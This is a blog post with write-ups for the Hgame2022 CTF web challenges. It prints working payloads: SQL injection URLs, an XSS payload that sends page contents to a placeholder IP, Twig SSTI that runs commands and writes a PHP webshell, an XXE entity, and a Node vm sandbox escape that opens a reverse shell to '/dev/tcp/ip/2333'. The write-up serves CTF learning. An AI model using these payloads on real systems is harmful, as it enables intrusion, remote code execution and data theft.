<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        :root {
            --accent-color: #FF4D4D;
        }
    </style>

    
    
    
    
    
    

    
    <title>Hgame2022 Web</title>
    <meta name="description" content="">
    <meta name="keywords" content='Web'>

    <meta property="og:url" content="https://kingbridgess.github.io/posts/hgame2022-web/">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Hgame2022 Web">
    <meta property="og:description" content="">
    <meta property="og:image" content="">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Hgame2022 Web">
    <meta name="twitter:description" content="">
    <meta property="twitter:domain" content="https://kingbridgess.github.io/posts/hgame2022-web/">
    <meta property="twitter:url" content="https://kingbridgess.github.io/posts/hgame2022-web/">
    <meta name="twitter:image" content="">

    
    <link rel="canonical" href="https://kingbridgess.github.io/posts/hgame2022-web/" />

    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/normalize.min.css" media="print" onload="this.media='all'">
    <link rel="stylesheet" type="text/css" href="https://kingbridgess.github.io/css/main.css">
    <link disabled id="dark-theme" rel="stylesheet" href="https://kingbridgess.github.io/css/dark.css">

    <script src="https://kingbridgess.github.io/js/svg-injector.min.js"></script>
    <script src="https://kingbridgess.github.io/js/feather-icons.min.js"></script>
    <script src="https://kingbridgess.github.io/js/main.js"></script>

    
    
</head>
<body>
        <script type="text/javascript">
            
            setThemeByUserPref();
        </script><header class="header">
    <nav class="header-nav">

        

        <div class="nav-title">
            <a class="nav-brand" href="https://kingbridgess.github.io">BRIdGE</a>
        </div>

        <div class="nav-links">
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/posts/"> Posts </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/tags/"> Tags </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/about"> About </a>
            </div>
            
            <div class="nav-link">
                <a href="https://kingbridgess.github.io/contact/"> Contact </a>
            </div>
            
            <div class="nav-link">
                <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
            </div>
            

            <span class="nav-icons-divider"></span>
            <div class="nav-link dark-theme-toggle">
                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
                <a>
                    <span id="theme-toggle-icon" data-feather="moon"></span>
                </a>
            </div>

            <div class="nav-link" id="hamburger-menu-toggle">
                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
                <a>
                    <span data-feather="menu"></span>
                </a>
            </div>

            
            <ul class="nav-hamburger-list visibility-hidden">
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/posts/"> Posts </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/tags/"> Tags </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/about"> About </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://kingbridgess.github.io/contact/"> Contact </a>
                </li>
                
                <li class="nav-item">
                    <a href="https://github.com/kingbridgess"><span data-feather='github'></span>  </a>
                </li>
                
                <li class="nav-item dark-theme-toggle">
                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
                    <a>
                        <span id="theme-toggle-icon" data-feather="moon"></span>
                    </a>
                </li>
            </ul>

        </div>
    </nav>
</header>
<main id="content">
    <div class="post container">
    <div class="post-header-section">
        <h1>Hgame2022 Web</h1>
        <small role="doc-subtitle"></small>
        <p class="post-date">
            February 19, 2022
        </p>

        <ul class="post-tags">
        
            <li class="post-tag"><a href="https://kingbridgess.github.io/tags/web">Web</a></li>
        
        </ul>
    </div>

    <div class="post-content">
        <p>
            <h1 id="week1">week1</h1>
<h2 id="ez_auth">ez_auth</h2>
<p>随便注册个账号，丢到<a href="https://jwt.io">https://jwt.io/</a>解密,secret是空的，改成admin，得到token</p>
<pre tabindex="0"><code>GET /v1/todo/list HTTP/1.1
Host: whatadminisdoingwhat.mjclouds.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://adminisdoingwhat.mjclouds.com/
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MCwiVXNlck5hbWUiOiJhZG1pbiIsIlBob25lIjoiIiwiRW1haWwiOiIiLCJleHAiOjE2NDI3MzI5NjgsImlzcyI6Ik1KY2xvdWRzIn0.YYX2DeTpeRJpJqM9Vbr3DIMrV0MAOaNk53VzqtPicLA
Origin: http://adminisdoingwhat.mjclouds.com
Connection: close
</code></pre><h2 id="蛛蛛嘿嘿我的蛛蛛">蛛蛛&hellip;嘿嘿♥我的蛛蛛</h2>
<p>爬虫爬到100页，flag在headers里</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> re  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">go</span>():  
</span></span><span style="display:flex;"><span>    url<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://hgame-spider.vidar.club/5b572441ee?key=yvHWAgnLk0DNnQDiUOYAzWXsnODq7mELHvYDgRFKpEkC</span><span style="color:#f1fa8c">%2F</span><span style="color:#f1fa8c">sDVkoVIYtg90</span><span style="color:#f1fa8c">%2F</span><span style="color:#f1fa8c">7PlRw4TdvToBS7Yq4hVcRWr</span><span style="color:#f1fa8c">%2F</span><span style="color:#f1fa8c">ch7g%3D%3D&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">while</span>(<span style="color:#bd93f9">1</span>):  
</span></span><span style="display:flex;"><span>        res<span style="color:#ff79c6">=</span>requests<span style="color:#ff79c6">.</span>get(url<span style="color:#ff79c6">=</span>url)  
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(res<span style="color:#ff79c6">.</span>text)  
</span></span><span style="display:flex;"><span>        key<span style="color:#ff79c6">=</span>getKey(res<span style="color:#ff79c6">.</span>text)  
</span></span><span style="display:flex;"><span>        url<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://hgame-spider.vidar.club/5b572441ee?&#34;</span><span style="color:#ff79c6">+</span>key  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">getKey</span>(text):  
</span></span><span style="display:flex;"><span>    pattern <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>compile(<span style="color:#f1fa8c">&#39;href=&#34;\?(.*?)&#34;&#39;</span>)  
</span></span><span style="display:flex;"><span>    key <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(re<span style="color:#ff79c6">.</span>search(pattern<span style="color:#ff79c6">=</span>pattern, string<span style="color:#ff79c6">=</span>text)<span style="color:#ff79c6">.</span>groups()[<span style="color:#bd93f9">0</span>])  
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> key  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#34;__main__&#34;</span>:  
</span></span><span style="display:flex;"><span>    go()
</span></span></code></pre></div><h2 id="tetris-plus">Tetris plus</h2>
<p>访问<a href="view-source:https://game.summ3r.top/Tetris/js/checking.js">view-source:https://game.summ3r.top/Tetris/js/checking.js</a>看到jsfuck，丢到控制台得到flag</p>
<h2 id="fujiwara-tofu-shop">Fujiwara Tofu Shop</h2>
<p>一串抽象headers&hellip;.</p>
<pre tabindex="0"><code>GET / HTTP/1.1
Host: shop.summ3r.top
User-Agent:Hachi-Roku
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga=GA1.2.1878958506.1642681012; _gid=GA1.2.1855424483.1642681012; __gads=ID=877a8288f5059d3f-2253dfab07d000ad:T=1642681012:RT=1642681012:S=ALNI_MZqr51gMyIVAufhagPFtLIBIB3WQg;flavor=Raspberry
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Referer:qiumingshan.net
Max-Forwards:100
Gasoline: 100
x-real-ip:127.0.0.1
</code></pre><h1 id="week2">week2</h1>
<h2 id="apache">Apache!</h2>
<p>CVE-2021-40438，payload略</p>
<h2 id="webpack-engine">webpack-engine</h2>
<p>开盒，css源码藏flag</p>
<h2 id="at0m的留言板">At0m的留言板</h2>
<p>xss，控制img标签。两种方法：
外带：
<code>&lt;img src=x onerror=document.body.appendChild(document.createElement('script')).src='ip/?get='+document.getElementsByTagName('script')[0].innerText;&gt;</code>
靠传回的截图：
<code>&lt;img src=&quot;xxx.png&quot; onerror=javascript:document.getElementsByClassName('content')[0].innerText=document.getElementsByTagName('script')[0].innerText;&gt;</code></p>
<h2 id="pokemon">Pokemon</h2>
<p>注入点在./error.php。后端把关键词直接替换为空字符，重写绕过；制表符绕过空格；like绕=</p>
<p>表名
<code>http://121.43.141.153:60056/error.php?code=1%09uniunionon%09seleselectct%091%2C%28seleselectct%09table_name%09frfromom%09infoorrmation_schema.tables%09whwhereere%09table_schema%09like%09database%28%29%09limit%091%2C1%29</code>
字段
<code>http://121.43.141.153:60056/error.php?code=1%09uniunionon%09seleselectct%091%2C%28seleselectct%09flag%09frfromom%09fllllllllaaaaaag%29</code></p>
<h2 id="一本单词书">一本单词书</h2>
<p>代码审计，输入直接就反序列化了。控制key，不要控制value，否则会变成字符串没法逃
<code>A|O:4:&quot;Evil&quot;:2:{s:4:&quot;file&quot;;s:5:&quot;/flag&quot;;s:4:&quot;flag&quot;;N;}</code></p>
<h1 id="week3">week3</h1>
<h2 id="securitycenter">SecurityCenter</h2>
<p>twig ssti，注入点在url参数
<code>http://146.56.223.34:60036/redirect.php?url={{[&quot;base64 /flag&quot;]|map(&quot;system&quot;)}}</code>
写马也行
<code>http://146.56.223.34:60036/redirect.php?url={{{&quot;&lt;?php+echo(file_get_contents('/flag'));phpinfo();&quot;:&quot;/var/www/html/ibuki.php&quot;}|map(&quot;file_put_contents&quot;)}}</code></p>
<h2 id="vidar-shop-demo">Vidar shop demo</h2>
<p>逻辑漏洞，删除未支付的订单可以退款</p>
<h2 id="login-me">login me</h2>
<p>sqlmap，数据库是sqlite</p>
<h1 id="week4">week4</h1>
<h2 id="markdown-online">Markdown Online</h2>
<p>首先绕登录验证</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> LoginController(req, res) {
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">if</span> (req.body.username <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;admin&#34;</span> <span style="color:#ff79c6">&amp;&amp;</span> req.body.password.length <span style="color:#ff79c6">===</span> <span style="color:#bd93f9">16</span>) {
</span></span><span style="display:flex;"><span>       <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>           req.body.password <span style="color:#ff79c6">=</span> req.body.password.toUpperCase()
</span></span><span style="display:flex;"><span>           <span style="color:#ff79c6">if</span> (req.body.password <span style="color:#ff79c6">!==</span> <span style="color:#f1fa8c">&#39;54gkj7n8uo55vbo2&#39;</span>) {
</span></span><span style="display:flex;"><span>               <span style="color:#ff79c6">return</span> res.status(<span style="color:#bd93f9">403</span>).json({msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;invalid username or password&#39;</span>})
</span></span><span style="display:flex;"><span>           }
</span></span><span style="display:flex;"><span>       } <span style="color:#ff79c6">catch</span> (__) {}
</span></span><span style="display:flex;"><span>       req.session[<span style="color:#f1fa8c">&#39;unique_id&#39;</span>] <span style="color:#ff79c6">=</span> randString.generate(<span style="color:#bd93f9">16</span>)
</span></span><span style="display:flex;"><span>       res.json({msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;ok&#39;</span>})
</span></span><span style="display:flex;"><span>   } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>       res.status(<span style="color:#bd93f9">403</span>).json({msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;login failed&#39;</span>})
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>官方wp是利用catch之后没return，触发报错从而绕过return。
<code>{&quot;username&quot;:&quot;admin&quot;,&quot;passowrd&quot;:{&quot;length&quot;: 16}}</code>
也可以利用js弱类型比较，传一个任意内容，长度为16的数组绕
<code>{&quot;username&quot;:&quot;admin&quot;,&quot;passowrd&quot;: [&quot;5&quot;,&quot;4&quot;,&quot;g&quot;,&quot;k&quot;,&quot;j&quot;,&quot;7&quot;,&quot;n&quot;,&quot;8&quot;,&quot;u&quot;,&quot;o&quot;,&quot;5&quot;,&quot;5&quot;,&quot;v&quot;,&quot;b&quot;,&quot;o&quot;,&quot;2&quot;] }</code>
然后就是网站的核心功能： md转html了。提交md后网站会转为html，然后bot会访问。做的时候严重怀疑是xss，但是出不了网xd。遂gg
看了wp发现是原型链污染逃逸vm沙箱，然后rce（学到了学到了
触发点在SubmitController</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">function</span> SubmitController(req, res) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (req.body.code <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">typeof</span> req.body.code <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#39;string&#39;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> code <span style="color:#ff79c6">=</span> req.body.code
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> source <span style="color:#ff79c6">=</span> md.render(code)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">const</span> browser <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> Browser()
</span></span><span style="display:flex;"><span>        browser.load(source, e =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">const</span> source <span style="color:#ff79c6">=</span> hljs.highlight(browser.html(), {language<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;html&#34;</span>}).value
</span></span><span style="display:flex;"><span>            res.json({source})
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>        res.status(<span style="color:#bd93f9">500</span>).send(<span style="color:#f1fa8c">&#34;code is required&#34;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>引用官方wp的话:</p>
<blockquote>
<p>接下来就是 markdown 预览功能了，markdown 解析用的是 markdown-it 库，并且开启了对 html 标签
的支持, 也就是说 markdown 源码里的 html 标签会被保留而不是被转义。
在 SubmitController 里，markdown-it 解析出来的 html 代码会被 zombie.js 加载，zobmie.js 在遇到
JavaScript 代码的时候会将其交给 vm 虚拟机执行
官方文档上有一句警告： The vm module is not a security mechanism. Do not use it to run
untrusted code. 。实际上 vm 模块可以逃逸， JavaScript 对象的继承是靠原型链实现的，借助原型链可访问到 vm 沙箱以外的内容，实现 RCE
所以解题思路就是利用 markdown-it 不转义 html 标签的条件，构造一个恶意的 script 标签，利用其中的
代码来逃逸 vm 沙箱并实现 RCE 。
网上很容易找到 vm 逃逸相关的 payload:</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff79c6">this</span>.__proto__.constructor.constructor(<span style="color:#f1fa8c">&#39;return process&#39;</span>)
</span></span><span style="display:flex;"><span>().mainModule.require(<span style="color:#f1fa8c">&#39;child_process&#39;</span>).execSync(<span style="color:#f1fa8c">&#39;calc&#39;</span>)
</span></span></code></pre></div><blockquote>
<p>不过得 bypass 一下 waf
利用 JavaScript 的语言特性， obj.contructor 可以变为 obj[&ldquo;contr&rdquo;+&ldquo;uctor&rdquo;] 的形式， + 也被 ban
了，可以用concat拼接字符串的形式: obj[&ldquo;constru&rdquo;.concat(&ldquo;ctor&rdquo;)]
this 和 process 可以用 eval(&ldquo;th&rdquo;+&ldquo;is&rdquo;) 的形式绕过。
由于没有 ban 掉 eval,其实绕过 waf 的方法很多，可以将要执行的代码base64编码，或者
String.fromCharCode 来构造，交个大家自由发挥了（逃。</p>
</blockquote>
<p>payload
<code>&lt;script&gt;eval('thi'.concat('s'))['__proto_'.concat('_')]['constructo'.concat('r')]['constructo'.concat('r')]('return proces'.concat('s'))()['mainModule']['require']('child_proces'.concat('s'))['execSync']('bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1')&lt;/script&gt;</code>
然鹅疼讯云经典ping不通，复现又失败了:&lt; (本地可以打通拿shell，题目环境可以ping本地网络，就是题目环境ping不了vps)
vm/vm2沙箱逃逸参照
<a href="http://t.zoukankan.com/ophxc-p-13663121.html">NodeJS沙箱逃逸&amp;&amp;vm</a></p>
<h2 id="comments">comments</h2>
<p>一种方法xxe，另外要用data伪协议+base64绕下面这个正则</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$attrs</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">sender</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;admin&#39;</span> <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">!</span>preg_match(<span style="color:#f1fa8c">&#39;/admin/i&#39;</span>, <span style="color:#8be9fd;font-style:italic">$str</span>)) {
</span></span><span style="display:flex;"><span>       <span style="color:#8be9fd;font-style:italic">$flag</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;hgame{xxxxx}&#39;</span>;
</span></span><span style="display:flex;"><span>       <span style="color:#8be9fd;font-style:italic">$attrs</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">content</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$flag</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code class="language-routeros" data-lang="routeros">&lt;?xml version=&#34;1.0&#34;?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY foo SYSTEM &#34;data://text/plain;base64,YWRtaW4=&#34;&gt;
]&gt;
&lt;comment&gt;&lt;sender&gt;&amp;foo;&lt;/sender&gt;
&lt;content&gt;
123
&lt;/content&gt;&lt;/comment&gt;
</code></pre><p>或者用xml实体编码绕</p>
<pre tabindex="0"><code class="language-routeros" data-lang="routeros">&lt;comment&gt;&lt;sender&gt;&amp;#97;dmin&lt;/sender&gt;
&lt;content&gt;
123
&lt;/content&gt;&lt;/comment&gt;
</code></pre><h2 id="filesystem">FileSystem</h2>
<p>很魔幻的一题，go语言在处理HandleFunc时如果方法为connect，访问路径为/../或//可以绕开路由限制。具体原理拜读wp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> main
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f1fa8c">&#34;net/http&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">fileHandler</span>(w http.ResponseWriter, r <span style="color:#ff79c6">*</span>http.Request) {
</span></span><span style="display:flex;"><span>	http.<span style="color:#50fa7b">FileServer</span>(http.<span style="color:#50fa7b">Dir</span>(<span style="color:#f1fa8c">&#34;./&#34;</span>)).<span style="color:#50fa7b">ServeHTTP</span>(w, r)
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">main</span>() {
</span></span><span style="display:flex;"><span>	http.<span style="color:#50fa7b">HandleFunc</span>(<span style="color:#f1fa8c">&#34;/&#34;</span>, fileHandler)
</span></span><span style="display:flex;"><span>	http.<span style="color:#50fa7b">HandleFunc</span>(<span style="color:#f1fa8c">&#34;/there_may_be_a_flag&#34;</span>, <span style="color:#8be9fd;font-style:italic">func</span>(w http.ResponseWriter, r <span style="color:#ff79c6">*</span>http.Request) {
</span></span><span style="display:flex;"><span>		w.<span style="color:#50fa7b">Write</span>([]<span style="color:#8be9fd;font-style:italic">byte</span>(<span style="color:#f1fa8c">`No! You can&#39;t see the flag!`</span>))
</span></span><span style="display:flex;"><span>	})
</span></span><span style="display:flex;"><span>	log.<span style="color:#50fa7b">Fatal</span>(http.<span style="color:#50fa7b">ListenAndServe</span>(<span style="color:#f1fa8c">&#34;:8889&#34;</span>, <span style="color:#ff79c6">nil</span>))
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X CONNECT --path-as-is
</span></span><span style="display:flex;"><span>http://filesystem.hgame.homeboyc.cn//there_may_be_a_flag
</span></span></code></pre></div><p>补充一下，curl命令中
-X指定方法
&ndash;path-as-is url斜杠不转码</p>

        </p>
    </div>
</div>

<aside class="post-toc">
    <nav id="toc">
        <nav id="TableOfContents">
  <ul>
    <li><a href="#week1">week1</a>
      <ul>
        <li><a href="#ez_auth">ez_auth</a></li>
        <li><a href="#蛛蛛嘿嘿我的蛛蛛">蛛蛛&hellip;嘿嘿♥我的蛛蛛</a></li>
        <li><a href="#tetris-plus">Tetris plus</a></li>
        <li><a href="#fujiwara-tofu-shop">Fujiwara Tofu Shop</a></li>
      </ul>
    </li>
    <li><a href="#week2">week2</a>
      <ul>
        <li><a href="#apache">Apache!</a></li>
        <li><a href="#webpack-engine">webpack-engine</a></li>
        <li><a href="#at0m的留言板">At0m的留言板</a></li>
        <li><a href="#pokemon">Pokemon</a></li>
        <li><a href="#一本单词书">一本单词书</a></li>
      </ul>
    </li>
    <li><a href="#week3">week3</a>
      <ul>
        <li><a href="#securitycenter">SecurityCenter</a></li>
        <li><a href="#vidar-shop-demo">Vidar shop demo</a></li>
        <li><a href="#login-me">login me</a></li>
      </ul>
    </li>
    <li><a href="#week4">week4</a>
      <ul>
        <li><a href="#markdown-online">Markdown Online</a></li>
        <li><a href="#comments">comments</a></li>
        <li><a href="#filesystem">FileSystem</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </nav>
</aside>



    

        </main><footer class="footer">
    <span>&copy; 2023 </span>
    <span>
        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
    </span>
</footer>
</body>
</html>
